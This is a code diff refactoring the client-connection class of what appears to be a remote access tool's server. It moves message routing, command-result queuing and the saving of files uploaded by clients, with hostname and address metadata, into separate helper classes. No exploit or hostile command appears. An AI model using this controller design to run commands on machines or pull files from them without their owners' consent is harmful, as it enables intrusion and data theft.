@@ -1,17 +1,13 @@
-import json
 import ntpath
 import os
-from datetime import datetime
 from typing import Generator, Optional
 
 from core.protocol.message_queue import MessageQueue, PendingCommandQueue, ReadySignalQueue
 from core.protocol.ratsocket import RATSocket
-from core.utils.files import get_output_stream, get_input_stream
-from core.utils.logger import logger, get_file_logger
-from server.config.config import BACKGROUND_MESSAGE_OUTPUT_TO_FILE# SHOW_MESSAGES_FROM_OTHER_CONNECTIONS
-
-if BACKGROUND_MESSAGE_OUTPUT_TO_FILE:
-    file_logger = get_file_logger('background_messages.log')
+from core.utils.files import get_output_stream
+from server.connection.file_receiver import ClientFileReceiver
+from server.connection.message_router import ClientMessageRouter
+from server.connection.result_dispatcher import ClientResultDispatcher
 
 
 class ClientConnection(RATSocket):
@@ -32,42 +28,19 @@ class ClientConnection(RATSocket):
         self.ready_queue = ReadySignalQueue()  # 文件传输就绪信号队列
         self.is_interactive = False  # 是否处于交互会话中
         self._message_id_counter = 0  # 连接内消息自增 ID
+
         # web
         self.on_unexpected_message = None
 
-        #web files
+        # web files
         # 文件接收保存位置（服务端 web 下载区）
         self.file_save_dir = file_save_dir
         self.on_file_saved = on_file_saved
 
-
-    #web files
-    def _build_unique_file_path(self, directory: str, filename: str) -> str:
-        safe_name = ntpath.basename(filename) or 'file.bin'
-        base, ext = os.path.splitext(safe_name)
-        candidate = os.path.join(directory, safe_name)
-        index = 1
-        while os.path.exists(candidate):
-            candidate = os.path.join(directory, f'{base}_{index}{ext}')
-            index += 1
-        return candidate
-
-    def _write_file_meta(self, file_path: str, original_name: str, size: int):
-        meta_path = file_path + '.meta.json'
-        meta = {
-            'client_id': self.info.get('id'),
-            'hostname': self.info.get('hostname'),
-            'addr': self.info.get('addr'),
-            'original_name': original_name,
-            'saved_name': os.path.basename(file_path),
-            'saved_path': file_path,
-            'size': size,
-            'created_at': datetime.now().isoformat()
-        }
-        with open(meta_path, 'w', encoding='utf-8') as f:
-            json.dump(meta, f, ensure_ascii=False, indent=2)
-
-    #web files end
+        # helpers
+        self.result_dispatcher = ClientResultDispatcher(self)
+        self.message_router = ClientMessageRouter(self)
+        self.file_receiver = ClientFileReceiver(self)
 
     # ------------------ ID/构包 ------------------ #
     def _generate_message_id(self) -> int:
@@ -130,81 +103,13 @@ class ClientConnection(RATSocket):
         return self.wait_for_result(data.get('id'), 'upload ' + filename)
 
     # ------------------ 接收消息 ------------------ #
-    def _handle_ready_message(self, data: dict) -> None:
-        """
-        处理文件传输就绪信号
-        """
-        self.ready_queue.put(data.get('status'))
-
-    def _handle_result_message(self, data: dict) -> None:
-        """
-        处理命令执行结果消息
-        """
-        self.info['cwd'] = data.get('cwd')
-        self.process_command_result(
-            data.get('id'),
-            data.get('status'),
-            data.get('text'),
-            data.get('eof')
-        )
-
-    def _handle_file_message(self, data: dict) -> None:
-        """
-        处理客户端上传的文件消息
-        """
-        self.info['cwd'] = data.get('cwd')
-        self.process_command_result(
-            data.get('id'),
-            *self.save_file(data.get('filename'), data.get('length')),
-            end=1
-        )
-
-    def _dispatch_received_message(self, data: dict) -> None:
-        """
-        根据消息类型分发处理
-        """
-        msg_type = data.get('type')
-
-        if msg_type == 'rdy':
-            self._handle_ready_message(data)
-            return
-
-        if msg_type == 'result':
-            self._handle_result_message(data)
-            return
-
-        if msg_type == 'file':
-            self._handle_file_message(data)
-            return
-
     def recv_message(self):
         """
         子线程接收消息并处理
         """
         data = self.recv()
-        self._dispatch_received_message(data)
+        self.message_router.dispatch(data)
 
-    # def save_file(self, filename, length):
-    #     """
-    #     保存文件
-    #     :param filename: 文件名
-    #     :param length: 文件长度
-    #     :return: 文件保存结果元组 (status, message)
-    #     """
-    #     file = os.path.abspath(filename)
-    #     try:
-    #         io = get_input_stream(file)
-    #         try:
-    #             self.send_signal(1)
-    #             self.recv_io(length, io)
-    #             return 1, f'File saved to: {file}'
-    #         except Exception as e:
-    #             return 0, f'Error receiving file from {self.address}: {e}'
-    #     except Exception as e:
-    #         self.send_signal(0)
-    #         return 0, f'Error opening local file: {e}'
-
-    #web files
     def save_file(self, filename, length):
         """
         保存文件
@@ -212,96 +117,7 @@ class ClientConnection(RATSocket):
         :param length: 文件长度
         :return: 文件保存结果元组 (status, message)
         """
-        target_dir = self.file_save_dir or os.getcwd()
-        os.makedirs(target_dir, exist_ok=True)
-
-        original_name = ntpath.basename(filename) or os.path.basename(filename)
-        file_path = self._build_unique_file_path(target_dir, original_name)
-
-        try:
-            io = get_input_stream(file_path)
-            try:
-                self.send_signal(1)
-                self.recv_io(length, io)
-
-                #web files
-                self._write_file_meta(file_path, original_name, length)
-                if callable(self.on_file_saved):
-                    try:
-                        self.on_file_saved(original_name, file_path, length)
-                    except Exception:
-                        pass
-
-                return 1, f'File saved to: {file_path}'
-            except Exception as e:
-                return 0, f'Error receiving file from {self.address}: {e}'
-        except Exception as e:
-            self.send_signal(0)
-            return 0, f'Error opening local file: {e}'
-    #web files end
-
-
-
-    # ------------------ 处理结果 ------------------ #
-    def _enqueue_expected_result(self, status, text, end) -> None:
-        """
-        将预期命令结果写入结果队列
-        """
-        self.message_queue.put(status, text, end)
-
-    def _is_expected_result(self, command_id) -> bool:
-        """
-        判断当前结果是否属于队首等待中的命令
-        """
-        pending_id = self.pending_command_ids.peek_first()
-        return command_id == pending_id
-
-    def process_command_result(self, command_id, status, text, end):
-        """
-        处理命令执行结果
-        :param command_id: 命令id
-        :param status: 状态
-        :param text: 结果文本
-        :param end: 是否结束
-        """
-        if self._is_expected_result(command_id):
-            self._enqueue_expected_result(status, text, end)
-            return
-
-        self.handle_unexpected_message(status, text, end)
-
-    def handle_unexpected_message(self, status, text, end):
-        """
-        处理非预期消息
-        """
-        #web
-        if callable(self.on_unexpected_message):
-            try:
-                self.on_unexpected_message(status, text, end)
-            except Exception:
-                pass
-        #web end
-
-        #如果交互态 且开启了背景消息写文件
-        if self.is_interactive:
-            if BACKGROUND_MESSAGE_OUTPUT_TO_FILE:
-                file_logger.info(f'Message from {self.address}: {text}')
-            else:
-                logger.info(text)
-            return
-
-        #非交互态开了背景消息写文件 就只记录到文件 不存未读消息
-        if BACKGROUND_MESSAGE_OUTPUT_TO_FILE:
-            file_logger.info(f'Message from {self.address}: {text}')
-            return
-
-        #如果非交互态 没开背景消息 收到消息 直接存储到未读消息
-        self.message_queue.put(status, text, end)
-
-        # if SHOW_MESSAGES_FROM_OTHER_CONNECTIONS:
-        #     logger.info(f'Message from {self.address}: {text}')
-        # else:
-        #     self.message_queue.put(status, text, end)
+        return self.file_receiver.save_file(filename, length)
 
     # ------------------ 等待结果 ------------------ #
     def wait_for_result(self, id: int, command: Optional[str]):
